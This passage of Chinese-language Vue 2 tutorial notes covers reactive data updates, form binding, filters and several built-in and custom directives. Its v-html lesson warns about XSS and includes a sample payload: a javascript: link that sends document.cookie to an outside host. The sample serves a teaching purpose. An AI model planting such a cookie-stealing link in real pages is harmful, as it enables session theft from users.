  <button @click="student.age++">年龄+1岁</button><br>
  <button @click="addSex">点我添加性别,默认值：男</button><br>
  <button @click="changeSex">修改性别</button><br>
  <button @click="addFriend">在列表首页添加一个朋友</button><br>
  <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button><br>
  <button @click="addHobby">添加一个爱好</button><br>
  <button @click="changeFirstHobby">修改第一个爱好为：开车</button><br>
  <button @click="removeSmoke">过滤掉抽烟</button>

  <h2>学生姓名：{{student.name}}</h2>
  <h2 v-if="student.sex">学生性别：{{student.sex}}</h2>
  <h2>学生年龄：真实{{student.age.rAge}}</h2>
  <h2>学生年龄：虚假{{student.age.sAge}}</h2>
  <h2>朋友们</h2>
  <ul>
    <li v-for="(f, index) in student.friends" :key="index">
      {{f.name}}--{{f.age}}
    </li>
  </ul>
  <h2>爱好</h2>
  <ul>
    <li v-for="(h, index) in student.hobby" :key="index">
      {{h}}
    </li>
  </ul>
</div>
<script>
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      school: {
        name: '尚硅谷',
        address: '北京',
        master: '王校长'
      },
      student: {
        name: 'tom',
        age: {
          rAge: 40,
          sAge: 18
        },
        hobby: [
          '抽烟',
          '睡觉',
          '敲代码'
        ],
        friends: [{
          name: 'jerry',
          age: 20
        }, {
          name: 'tony',
          age: 36
        }]
      }
    },
    methods: {
      addSex() {
        // Vue.set(this.student, 'sex', '男')
        this.$set(this.student, 'sex', '男')
      },
      changeSex() {
        this.student.sex = '女'
      },
      addFriend() {
        this.student.friends.unshift({
          name: 'jack',
          age: 30
        })
      },
      updateFirstFriendName() {
        this.student.friends[0].name = 'zhangsan'
        this.student.friends[0].age = 20
        // this.student.friends[0] = {
        //     name: 'zhangsan',
        //     age: 20
        // }    // 不奏效 数组不是响应式的
      },
      addHobby() {
        this.student.hobby.push('呵呵')
      },
      changeFirstHobby() {
        // this.student.hobby.splice(0, 1, '开车')
        this.$set(this.student.hobby, 0, '开车')
      },
      removeSmoke() {
        this.student.hobby = this.student.hobby.filter((h) => {
          return h !== '抽烟'
        })
      }
    }
  })
</script>
```

#### 038_收集表单数据

**知识点：**

收集表单数据：

​	若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值

​	若：<input type="radio"/>，则v-model收集的是value值，且要给标签配上value值

​	若：<input type="checkbox"/>

​		1. 没有配置input的value值，那么收集的就是checked（勾选 or 未勾选，是布尔值）

​		2.配置input的value值属性：

​			1. v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）

​			2. v-model的初始值是数组，那么收集的就是value组成的数组

​		lazy：失去焦点再收集数据

​		number：输入字符串转为有效的数字

​		trim：输入首尾空格过滤

```html
<div id="root">
  <form @submit.prevent="demo">
    帐号：<input type="text" v-model.trim="account"> <br><br> 密码：
    <input type="password" v-model="password"> <br><br>性别：
    <input type="number" v-model.number="age"> <br><br> 性别： 男
    <input type="radio" name="sex" value="1" v-model="sex"> 女
    <input type="radio" name="sex" value="0" v-model="sex">
    <br><br> 爱好： 学习
    <input type="checkbox" v-model="hobby" value="学习"> 打游戏
    <input type="checkbox" v-model="hobby" value="打游戏"> 吃饭
    <input type="checkbox" v-model="hobby" value="吃饭"><br><br> 所属校区：
    <select v-model="city">
      <option value="">请选择校区</option>
      <option value="beijing">北京</option>
      <option value="shanghai">上海</option>
      <option value="shenzhen">深圳</option>
    </select><br><br> 其他信息：
    <textarea v-model.lazy="other"></textarea>
    <br><br>
    <input type="checkbox" v-model="agree">阅读并接受
    <a href="http://www.baidu.com">《用户协议》</a>
    <br><br>
    <button>提交</button>
  </form>
</div>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      account: '',
      password: '',
      sex: '1',
      hobby: [],
      city: '',
      other: '',
      agree: false,
      age: ''
    },
    methods: {
      demo() {
        console.log(JSON.stringify(this._data));
      }
    }
  })
</script>

```

#### 039_过滤器

```html
<div id="root">
  <h2>显示格式化后的时间</h2>
  <!-- 计算属性实现 -->
  <h3>现在是：{{fmtTime}}</h3>
  <!-- methods实现 -->
  <h3>现在是：{{getFmtTime()}}</h3>
  <!-- 过滤器实现 -->
  <h3>现在是：{{time | timeFormater}}</h3>

  <h3>现在是：{{time | timeFormater('YYYY-MM-DD')}}</h3>

  <h3>现在是：{{time | timeFormater('YYYY-MM-DD') | mySlice}}</h3>
</div>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      time: 1638855386455
    },
    computed: {
      fmtTime() {
        return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
      }
    },
    methods: {
      getFmtTime() {
        // 调dayjs第三方库,在BootCDN官方下载
        return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
      }
    },
    filters: {
      timeFormater(val, str = 'YYYY-MM-DD HH:mm:ss') {
        // console.log(val);
        return dayjs(val).format(str)
      },
      mySlice(val) {
        return val.slice(0, 4)
      }
    }
  })
</script>
```

#### 040_v-text指令

我们学过的指令： 	

​	v-bind	: 单向绑定解析表达式, 可简写为 :xxx 	

​	v-model	: 双向数据绑定 	

​	v-for  	: 遍历数组/对象/字符串 	

​	v-on   	: 绑定事件监听, 可简写为@ 	

​	v-if 	: 条件渲染（动态控制节点是否存存在） 	

​	v-else 	: 条件渲染（动态控制节点是否存存在） 	

​	v-show 	: 条件渲染 (动态控制节点是否展示) 	

​	v-text指令： 		

​		1.作用：向其所在的节点中渲染文本内容，放入标签则也会被当成文本解析 		

​		2.与插值语法的区别：v-text会替换掉节点中的内容，你原来的内容会被代替，无法与原来的内容一起出现，{{xx}}则可以。

```html
<div id="root">
  <div>你好，{{name}}</div>
  <!-- print: 你好，尚硅谷 -->
  <div v-text="name">你好，</div>
  <!-- print: 尚硅谷 -->
  <div v-text="str">你好，</div>
  <!-- print: <h3>124</h3> -->
</div>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      name: '尚硅谷',
      str: '<h3>124</h3>'
    }
  })
</script>
```

#### 041_v-html指令

1. 作用：向指定节点中渲染包含html结构的内容。更新元素的 innerHTML。注意：内容 按普通 HTML 插入 , 不会作为 Vue 模板进行编译。如果试图使用 v-html 组合模板，可以重新考虑是否通过使用组件来替代。 	
2. 与插值语法的区别：
   1. v-html会替换掉节点中所有的内容，{{xx}}则不会。 		
   2. v-html可以识别html结构，与v-text不同。 	

3. 严重注意：v-html有安全性问题！！！！ 		
   1. 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。 		
   2. 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！

```html
<div id="root">
  <div>你好，{{name}}</div>
  <!-- print: 你好，尚硅谷 -->
  <div v-html="str">你好，</div>
  <!-- print: 124-->
  <div v-html="str2"></div>
</div>
<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      name: '尚硅谷',
      str: '<h3>124</h3>',
      str2: '<a href=javascript:location.href="http://www.baidu.com?" + document.cookie>快来！</a>'
    }
  })
</script>
```

#### 041_v-cloak指令

v-cloak指令（没有值）： 	

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。 
2. 使用css配合v-cloak可以解决网速慢时页面展示出模板{{xxx}}的问题。

script引入的是我自制的server，作用是5s后script标签加载成功，注意script标签的的引入位置，是先执行html模板，5s后渲染页面{{name}}变为尚硅谷，想让{{name}}在5s内隐藏，不显示在页面中，script标签加载成功后直接出现尚硅谷，用v-cloak。

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>v-cloak指令</title>
    <style>
      [v-cloak] {
        display: none;
      }
    </style>
    <!-- 引入Vue -->
  </head>

  <body>
    <div id="root">
      <h2 v-cloak>{{name}}</h2>
    </div>
    <script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
  </body>

  <script type="text/javascript">
    console.log(1)
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    new Vue({
      el: '#root',
      data: {
        name: '尚硅谷'
      }
    })
  </script>
</html>
```

#### 042_v-once指令

v-once指令： 	

1. v-once所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

```html
<div id="root">
  <h2 v-once>初始化的n值是：{{n}}</h2>
  <h2>当前的n值是：{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>

<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      n: 1
    }
  })
</script>
```

#### 043_v-pre指令

v-pre指令： 	

1. 跳过其所在节点的编译过程。 	
2. 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。

**用于vue性能优化**

```html
<div id="root">
  <h2 v-pre>Vue其实很简单</h2>
  <h2>当前的n值是：{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>

<script>
  Vue.config.productionTip = false
  new Vue({
    el: '#root',
    data: {
      n: 1
    }
  })
</script>
```

#### 044_自定义指令

**总结：**

一、定义语法：

1. 局部指令：

```vue
new Vue({
	directives:{指令名: 配置对象}
})
或
new Vue({
	directive() {指令名, 回调函数}
})
```

​        (2).全局指令：

```vue
Vue.directive(指令名, 配置对象) 或   Vue.directive(指令名, 回调函数)      
```

二、配置对象中常用的3个回调：

1. bind：指令与元素成功绑定时调用。

2. inserted：指令所在元素被插入页面时调用。

3. update：指令所在模板结构被重新解析时调用。

三、备注：

1. 指令定义时不加v-，但使用时要加v-；

2. 指令名如果是多个单词，要使用kebab-case命名方式，别忘了加"",不要用camelCase命名。

3. 所有指令相关的this都是window

```html
<div id="root">
  <!-- 需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。
需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。 -->
  <!-- 自定义指令——函数式 -->
  <h2>{{name}}</h2>
  <h2>当前的n值是: <span v-text="n"></span></h2>
  <!-- <h2>放大十倍后的n值是: <span v-big-number="n"></span></h2> -->
  <h2>放大十倍后的n值是: <span v-big="n"></span></h2>
  <button @click="n++">点我n+1</button>
  <hr>
  <!-- 自定义指令——对象式 -->
  <input type="text" v-fbind:value="n">
</div>
<script>
  Vue.config.productionTip = false

  // 定义全局指令 
  // Vue.directive('fbind', {
  //     // 指令与元素成功绑定时（一上来）
  //     bind(element, binding) {
  //         console.log('fbind-bind', this); // 此处的this是Window
  //         element.value = binding.value
  //     },
  //     // 指令所在元素被插入页面时调用
  //     inserted(element, binding) {
  //         console.log('fbind-insert', this); // 此处的this是Window
  //         element.focus()
  //     },
  //     // 指令所在的模版被重新解析时
  //     update(element, binding) {
  //         console.log('fbind-update', this); // 此处的this是Window
  //         element.value = binding.value
  //     }
  // })

  // Vue.directive('big', function(element, binding) {
  //     element.innerText = binding.value * 10
  //     console.log(element, binding);
  // })
  new Vue({
    el: '#root',
    data: {
      name: '尚硅谷',
      n: 1
    },
    directives: {
      // big 函数何时被调用？
      // 1. 指令与元素成功绑定时（一上来）
      // 2. 指令所在的模版被重新解析时
      'big-number' (element, binding) {
        element.innerText = binding.value * 10
        console.log(element, binding);
      },
      big(element, binding) {
        console.log('big', this); // 此处的this是Window
        element.innerText = binding.value * 10
        console.log(element, binding);
      },
      // fbind(element, binding) {
      //     element.value = binding.value
      //     // idea_1: 
      //     // element.autofocus = true

      //     // idea_2:
      //     // setInterval(() => {
      //     //     element.focus()
      //     // }, 0);
      // }
      // fbind: {
      //     // 指令与元素成功绑定时（一上来）
      //     bind(element, binding) {
      //         console.log('fbind-bind', this); // 此处的this是Window
      //         element.value = binding.value
      //     },
      //     // 指令所在元素被插入页面时调用
      //     inserted(element, binding) {
      //         console.log('fbind-insert', this); // 此处的this是Window
      //         element.focus()
      //     },
      //     // 指令所在的模版被重新解析时
      //     update(element, binding) {
      //         console.log('fbind-update', this); // 此处的this是Window
      //         element.value = binding.value
      //     }
      // }
    }
  })
</script>
```

#### 045_引出生命周期

```html

```

